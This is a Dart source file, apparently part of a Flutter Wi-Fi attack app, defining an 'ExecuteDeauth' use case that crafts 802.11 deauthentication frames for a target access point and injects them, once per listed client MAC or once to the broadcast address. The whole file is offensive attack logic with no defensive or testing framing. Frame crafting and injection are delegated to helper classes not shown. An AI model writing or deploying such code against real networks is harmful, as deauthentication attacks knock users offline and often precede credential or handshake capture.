// domain/usecases/execute_deauth.dart
import '../entities/access_point.dart';
import '../repositories/wifi_repository.dart';
import '../../utils/packet_parser.dart';

class DeauthResult {
  final int framesSent;
  final int targetCount;

  DeauthResult({required this.framesSent, required this.targetCount});
}

/// Use case for executing 802.11 Deauthentication against target client(s) or broadcast.
class ExecuteDeauth {
  final WifiRepository repository;

  ExecuteDeauth(this.repository);

  Future<DeauthResult> call(AccessPoint target, List<String> clientMacs) async {
    if (clientMacs.isEmpty) {
      // Unicast fallback / broadcast if no specific clients target
      final frame = PacketParser.craftDeauth(target.bssid, 'FF:FF:FF:FF:FF:FF');
      final ok = await repository.injectFrame(frame);
      return DeauthResult(framesSent: ok ? 1 : 0, targetCount: 1);
    }

    int successCount = 0;
    for (final client in clientMacs) {
      final frame = PacketParser.craftDeauth(target.bssid, client);
      final ok = await repository.injectFrame(frame);
      if (ok) successCount++;
    }

    return DeauthResult(framesSent: successCount, targetCount: clientMacs.length);
  }
}
